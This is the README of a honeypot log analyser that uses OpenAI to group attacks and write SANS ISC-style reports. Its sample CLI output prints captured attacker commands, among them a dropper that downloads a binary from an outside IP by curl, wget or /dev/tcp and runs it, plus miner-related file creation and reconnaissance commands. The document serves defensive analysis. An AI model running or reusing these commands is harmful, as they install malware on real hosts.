
# honeypot-ai

#### A modular honeypot log analyzer and OSINT collector with OpenAI integration to easily create ISC style reports and interactively chat with AI about attacks. Currently supports Cowrie, DShield and Zeek logs. 
> Built by Lucas Faudman for SANS ISC/DShield

## Attack Examples

| Attack | AI Run Steps |
| --- | --- |
| [Botnet Inclusion and Propagation attempt by Attackers from Germany and Japan](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Botnet%20Inclusion%20and%20Propagation%20attempt%20by%20Attackers%20from%20Germany%20and%20Japan) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Botnet%20Inclusion%20and%20Propagation%20attempt%20by%20Attackers%20from%20Germany%20and%20Japan/run-steps.md) |
| [Unauthenticated Command Execution Attack Exploiting Vulnerable Netgear Devices from IP 178.72.69.244 for Malware Deployment](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Unauthenticated%20Command%20Execution%20Attack%20Exploiting%20Vulnerable%20Netgear%20Devices%20from%20IP%20178.72.69.244%20for%20Malware%20Deployment) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Unauthenticated%20Command%20Execution%20Attack%20Exploiting%20Vulnerable%20Netgear%20Devices%20from%20IP%20178.72.69.244%20for%20Malware%20Deployment/run-steps.md) |
| [Multi-Stage SSH Brute Force Attack with Possible Botnet Indications Launched from Compromised DigitalOcean Server](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Stage%20SSH%20Brute%20Force%20Attack%20with%20Possible%20Botnet%20Indications%20Launched%20from%20Compromised%20DigitalOcean%20Server) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Stage%20SSH%20Brute%20Force%20Attack%20with%20Possible%20Botnet%20Indications%20Launched%20from%20Compromised%20DigitalOcean%20Server/run-steps.md) |
| [Multi-Vector Cyber Attack Exploiting Shellshock and Targeting Apache Tomcat via Compromised IP Addresses](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Vector%20Cyber%20Attack%20Exploiting%20Shellshock%20and%20Targeting%20Apache%20Tomcat%20via%20Compromised%20IP%20Addresses) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Vector%20Cyber%20Attack%20Exploiting%20Shellshock%20and%20Targeting%20Apache%20Tomcat%20via%20Compromised%20IP%20Addresses/run-steps.md) |
| [Malicious IP 204.76.203.13: Unauthorized Access, Malware Deployment, and Persistence](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Malicious%20IP%20204.76.203.13%3A%20Unauthorized%20Access%2C%20Malware%20Deployment%2C%20and%20Persistence) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Malicious%20IP%20204.76.203.13%3A%20Unauthorized%20Access%2C%20Malware%20Deployment%2C%20and%20Persistence/run-steps.md) |
| [Telnet Compromise and Shell Script Malware Deployment on Linux Honeypot by Organized Attacker](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Telnet%20Compromise%20and%20Shell%20Script%20Malware%20Deployment%20on%20Linux%20Honeypot%20by%20Organized%20Attacker) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Telnet%20Compromise%20and%20Shell%20Script%20Malware%20Deployment%20on%20Linux%20Honeypot%20by%20Organized%20Attacker/run-steps.md) |

<details>
<summary>
<h2>Setup</h2>
</summary>


#### Step 1: Clone the Repository

````bash
git clone https://github.com/LucasFaudman/honeypot-ai
````

#### Step 2: Run the Setup Script [setup.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup.sh)

````bash
chmod +x honeypot-ai/setup.sh && honeypot-ai/setup.sh
````
> This will install all required packages in a virtual environment and walk you through setting up your config.json file. 

> You will need your honeypot IP and login credentials to create [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh) and [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh).

#### Optional: Install Zeek on your Honeypot using [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh)

````bash
honeypot-ai/install-zeek-on-honeypot.sh
````

#### Step 3: Sync Logs from Honeypot to local logs directory using [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh)

````bash
honeypot-ai/sync-logs.sh
````

#### Step 4: Run Honeypot-AI with --help to see all command line arguments and options.

````bash
honeypot-ai/run.sh --help
````

OR

````bash
python3 honeypot-ai/main.py --help
````

</details>

---


<details>
<summary>
<h2>Basic Usage</h2>
</summary>

> Load attacks from logs then list all attacks

````bash
honeypot-ai/run.sh --load-from-logs --list-attacks
````

<details>
<summary>
Output
</summary>


````
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --load-from-logs --list-attacks
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.CowrieParser object at 0x10ba43ed0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.ZeekParser object at 0x10ba43e10>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(50->49) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 7056: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6 <- bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747 by malware_urls
Merged 0 attacks by out of 7056 attempts (0.0000%) 
Merge Attacks Time: 0.7498s
(49->49) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\?cd\+/tmp')
Regex merged a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
Regex merged 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 into 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 on commands: re.compile('cat /proc/mounts; /bin/busybox [\w\d]+')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\??A@/ ?X'8ELFX")
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(49->42) - Merged 7 attacks with shared sig regexes

Exceptions:
Total: 0

Stats:
 374 IPs with >=1 successful logins
 339 IPs with >=1 commands
 223 IPs with >=1 commands and >=1 malware
 3519 IPs with >=1 http requests
 58 IPs with flagged http requests
 4941 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 42

Attacks:
1: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
2: Attack (chash: 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8), SourceIPs: 14, Sessions: 602, SSH: 602, Commands: 4, Cmdlogs: 1, Malware: 1 
3: Attack (hhash: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656), SourceIPs: 10, Sessions: 1306, HTTP: 1306, Httplogs: 147 
4: Attack (chash: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804), SourceIPs: 7, Sessions: 634, SSH: 634, Commands: 2, Cmdlogs: 1, 
5: Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 6, Sessions: 767, SSH: 767, Commands: 1, Cmdlogs: 1, 
6: Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 18, HTTP: 18, Httplogs: 1 
7: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
8: Attack (hhash: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518), SourceIPs: 3, Sessions: 1561, HTTP: 1561, Httplogs: 520 
9: Attack (hhash: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55), SourceIPs: 3, Sessions: 63, HTTP: 63, Httplogs: 6 
10: Attack (hhash: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13), SourceIPs: 3, Sessions: 48, HTTP: 48, Httplogs: 16 
11: Attack (hhash: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1), SourceIPs: 3, Sessions: 21, HTTP: 21, Httplogs: 2 
12: Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 
13: Attack (hhash: 0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98), SourceIPs: 3, Sessions: 3, HTTP: 3, Httplogs: 1 
14: Attack (chash: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80), SourceIPs: 2, Sessions: 1658, SSH: 1656, HTTP: 2, Commands: 1, Cmdlogs: 1, Httplogs: 1 
15: Attack (hhash: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00), SourceIPs: 2, Sessions: 20, HTTP: 20, Httplogs: 9 
16: Attack (hhash: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2), SourceIPs: 2, Sessions: 6, HTTP: 6, Httplogs: 2 
17: Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
18: Attack (hhash: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e), SourceIPs: 2, Sessions: 2, HTTP: 2, Httplogs: 1 
19: Attack (hhash: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2), SourceIPs: 1, Sessions: 560, HTTP: 560, Httplogs: 560 
20: Attack (hhash: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9), SourceIPs: 1, Sessions: 142, HTTP: 142, Httplogs: 71 
21: Attack (hhash: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59), SourceIPs: 1, Sessions: 32, HTTP: 32, Httplogs: 15 
22: Attack (hhash: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a), SourceIPs: 1, Sessions: 30, HTTP: 30, Httplogs: 26 
23: Attack (hhash: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf), SourceIPs: 1, Sessions: 27, HTTP: 27, Httplogs: 27 
24: Attack (hhash: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65), SourceIPs: 1, Sessions: 24, HTTP: 24, Httplogs: 24 
25: Attack (hhash: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67), SourceIPs: 1, Sessions: 23, HTTP: 23, Httplogs: 22 
26: Attack (hhash: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac), SourceIPs: 1, Sessions: 12, HTTP: 12, Httplogs: 11 
27: Attack (hhash: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758), SourceIPs: 1, Sessions: 10, HTTP: 10, Httplogs: 10 
28: Attack (hhash: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf), SourceIPs: 1, Sessions: 4, HTTP: 4, Httplogs: 1 
29: Attack (chash: 4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb), SourceIPs: 1, Sessions: 2, SSH: 2, Commands: 7, Cmdlogs: 2, 
30: Attack (hhash: 3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
31: Attack (hhash: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
32: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
33: Attack (chash: bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 1, Cmdlogs: 1, 
34: Attack (hhash: 11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
35: Attack (hhash: 3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
36: Attack (hhash: d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
37: Attack (hhash: 2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
38: Attack (hhash: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
39: Attack (hhash: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
40: Attack (hhash: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
41: Attack (hhash: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
42: Attack (hhash: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
Total: 42
Honeypot AI Finished Successfully!
````

</details>


> Load attacks from logs then list first 5 attacks sorted in descending order by number of commands, then start time. Then print the commands for each attack

````bash
honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands
````

<details>
<summary>
Output
</summary>


````
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1167bacd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11683edd0>

Stats:
 374 IPs with >=1 successful logins
 339 IPs with >=1 commands
 223 IPs with >=1 commands and >=1 malware
 3519 IPs with >=1 http requests
 58 IPs with flagged http requests
 4941 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 5

Attacks:
1: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
2: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
3: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
4: Attack (chash: 4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb), SourceIPs: 1, Sessions: 2, SSH: 2, Commands: 7, Cmdlogs: 2, 
5: Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
Total: 5


Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
########################################################################################################################
#                                                       commands                                                       #
########################################################################################################################
#                                                                                                                      #
# ['echo 1 && cat /bin/echo',                                                                                          #
#  'nohup $SHELL -c "curl http://108.181.122.221:60101/linux -o /tmp/1d0xrd25u0; '                                     #
#  'if [ ! -f /tmp/1d0xrd25u0 ]; then wget http://108.181.122.221:60101/linux -O '                                     #
#  '/tmp/1d0xrd25u0; fi; if [ ! -f /tmp/1d0xrd25u0 ]; then exec '                                                      #
#  "6<>/dev/tcp/108.181.122.221/60101 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                      #
#  '/tmp/1d0xrd25u0 && chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                                   #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==; '                                                                                                            #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                     #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==" '                                                                                                            #
#  '&',                                                                                                                #
#  'head -c 0 > /tmp/UVPRQdahjX',                                                                                      #
#  'chmod 777 /tmp/UVPRQdahjX',                                                                                        #
#  '/tmp/UVPRQdahjX '                                                                                                  #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==',                                                                                                             #
#  'cp /tmp/UVPRQdahjX /tmp/linux',                                                                                    #
#  'head -c 0 > /tmp/winminer_sign',                                                                                   #
#  'head -c 0 > /tmp/winminer',                                                                                        #
#  'head -c 0 > /tmp/linux_sign',                                                                                      #
#  'head -c 0 > /tmp/mipsel_linux_sign',                                                                               #
#  'head -c 0 > /tmp/mips_linux',                                                                                      #
#  'head -c 0 > /tmp/mips_linux_sign',                                                                                 #
#  'head -c 0 > /tmp/windows_sign',                                                                                    #
#  'head -c 0 > /tmp/arm_linux_sign',                                                                                  #
#  'head -c 0 > /tmp/miner',                                                                                           #
#  'head -c 0 > /tmp/mipsel_linux',                                                                                    #
#  'head -c 0 > /tmp/windows',                                                                                         #
#  'head -c 0 > /tmp/arm_linux',                                                                                       #
#  'head -c 0 > /tmp/miner_sign',                                                                                      #
#  '',                                                                                                                 #
#  'exit']                                                                                                             #
#                                                                                                                      #
########################################################################################################################



Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
##################################################################################
#                                    commands                                    #
##################################################################################
#                                                                                #
# ['/ip cloud print',                                                            #
#  'ifconfig',                                                                   #
#  'uname -a',                                                                   #
#  'cat /proc/cpuinfo',                                                          #
#  "ps | grep '[Mm]iner'",                                                       #
#  "ps -ef | grep '[Mm]iner'",                                                   #
#  'ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log '    #
#  '/etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman ' #
#  '/dev/modem* /var/config/sms/*',                                              #
#  'echo Hi | cat -n']                                                           #
#                                                                                #
##################################################################################



Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
#############################################################
#                          commands                         #
#############################################################
#                                                           #
# ['sh',                                                    #
#  'shell',                                                 #
#  'enable',                                                #
#  'system',                                                #
#  'ping;sh',                                               #
#  'kill %%1',                                              #
#  '',                                                      #
#  '/bin/busybox cat /proc/self/exe || cat /proc/self/exe'] #
#                                                           #
#############################################################

...Truncated...
Honeypot AI Finished Successfully!
````

</details>


> Organize attacks with at most 10 source IPs into attack directories for faster loading and to prepare for storing analysis results

````bash
honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10
````

<details>
<summary>
Output
</summary>


````
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Skipping attack ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70 with 35 IPs (max_ips_per_attack=10)
Skipping attack 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8 with 14 IPs (max_ips_per_attack=10)
Organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Prepared regex pattern: b'(35\.85\.244\.164|35\.85\.237\.231|44\.229\.31\.222|44\.233\.198\.138|54\.187\.66\.79|3\.238\.240\.225|194\.67\.201\.41|54\.222\.143\.33|52\.80\.229\.231|52\.81\.27\.255|103\.163\.215\.12|164\.90\.163\.107|49\.234\.50\.52|44\.207\.239\.204|128\.199\.218\.182|143\.198\.46\.19|128\.199\.22\.193|59\.4\.55\.180|103\.130\.189\.246|113\.111\.174\.87|182\.31\.217\.18|150\.158\.27\.38|182\.72\.219\.186|66\.240\.205\.34|104\.237\.135\.225|192\.155\.86\.241|23\.92\.24\.103|72\.14\.181\.67|117\.190\.226\.115|222\.111\.179\.159|31\.208\.22\.102|73\.43\.215\.50|18\.138\.212\.58|18\.116\.202\.221|13\.250\.8\.18|185\.180\.143\.49|45\.156\.129\.2|185\.180\.143\.141|164\.92\.192\.25|134\.122\.89\.242|138\.68\.163\.10|68\.69\.186\.30|45\.142\.182\.77|91\.92\.243\.232|93\.223\.169\.159|27\.93\.25\.111|111\.216\.194\.148|172\.104\.228\.72|93\.123\.85\.82|91\.92\.243\.65|202\.90\.136\.204|149\.127\.191\.44|91\.92\.249\.164|94\.156\.65\.188|192\.227\.146\.253|123\.99\.201\.37|221\.160\.138\.230|112\.168\.208\.76|41\.160\.238\.201|218\.145\.61\.20|188\.166\.224\.136|91\.92\.243\.167|185\.224\.128\.191|185\.180\.143\.80|23\.20\.205\.139|43\.135\.123\.64|43\.132\.196\.160|20\.197\.51\.98|103\.121\.39\.54|120\.63\.180\.123|47\.105\.33\.16|102\.37\.103\.237|45\.95\.147\.236|47\.120\.37\.43|14\.41\.43\.78|62\.171\.167\.21|3\.93\.0\.214|103\.85\.95\.36|95\.214\.53\.103|193\.32\.162\.174|172\.98\.33\.206|188\.166\.174\.44|178\.72\.69\.244|95\.214\.53\.99)'
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687/auth_random.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/http.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ntp.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/telemetry.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-20.json
...Truncated...
Done organizing attack directories
Finished organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Honeypot AI Finished Successfully!
````

</details>


> Load attacks from the attacks directory that have at least 10 commands or at least 3 HTTP requests, then print the first command, 3 most common HTTP requests, and the most common src ip for each attack

````bash
honeypot-ai/run.sh --load-from-attacks-dir --min-commands 10 --min-http-requests 3 --print-attrs first_command most_common3_http_requests most_common_src_ip
````

<details>
<summary>
Output
</summary>


````
